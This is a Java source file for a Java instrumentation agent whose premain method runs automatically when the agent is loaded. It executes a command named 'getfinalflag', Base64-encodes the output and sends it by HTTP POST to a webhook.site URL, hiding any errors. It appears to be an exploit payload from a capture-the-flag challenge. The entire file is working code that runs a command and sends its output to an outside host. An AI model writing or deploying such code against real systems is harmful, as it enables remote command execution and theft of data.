package src;

import java.io.*;
import java.net.http.*;
import java.net.*;
import java.util.*;
import java.nio.charset.*;

public class Agent {

  private static String getFormDataAsString(Map<String, String> formData) {
      StringBuilder formBodyBuilder = new StringBuilder();
      for (Map.Entry<String, String> singleEntry : formData.entrySet()) {
          if (formBodyBuilder.length() > 0) {
              formBodyBuilder.append("&");
          }
          formBodyBuilder.append(URLEncoder.encode(singleEntry.getKey(), StandardCharsets.UTF_8));
          formBodyBuilder.append("=");
          formBodyBuilder.append(URLEncoder.encode(singleEntry.getValue(), StandardCharsets.UTF_8));
      }
      return formBodyBuilder.toString();
  }

  public static void premain(String args){
      try {
        String cmd = "getfinalflag";
        String url = "https://webhook.site/a418960b-ca31-47f9-b5fd-8d3fd949fe31";
        Process process = Runtime.getRuntime().exec(cmd);
        StringBuilder processOutput = new StringBuilder();

        try (BufferedReader processOutputReader = new BufferedReader(
                new InputStreamReader(process.getInputStream()));)
        {
            String readLine;

            while ((readLine = processOutputReader.readLine()) != null)
            {
                processOutput.append(readLine + System.lineSeparator());
            }

            process.waitFor();
        }

        String cmdOut = processOutput.toString();
        
        HttpClient httpclient = HttpClient.newHttpClient();

        Map<String, String> formData = new HashMap<String, String>();
        formData.put("cmd_output", Base64.getEncoder().encodeToString(cmdOut.getBytes()));

        HttpRequest request = HttpRequest.newBuilder()
          .uri(URI.create(url))
          .POST(HttpRequest.BodyPublishers.ofString(Agent.getFormDataAsString(formData)))
          .build();

        httpclient.send(request, HttpResponse.BodyHandlers.ofString());

      } catch(Exception e) {
      }
  }
}